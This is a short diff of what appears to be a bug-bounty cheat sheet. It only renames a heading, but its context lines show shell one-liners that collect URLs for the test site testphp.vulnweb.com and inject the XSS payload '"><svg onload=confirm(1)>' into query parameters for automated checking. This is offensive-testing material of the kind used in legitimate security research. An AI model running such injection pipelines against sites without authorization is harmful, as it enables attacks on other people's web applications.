@@ -27,7 +27,7 @@ urldedupe bhedak
 waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | xsschecker
 ```
 
-Airixss XSS
+GF
 ```bash
 waybackurls testphp.vulnweb.com | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | xsschecker
 ```
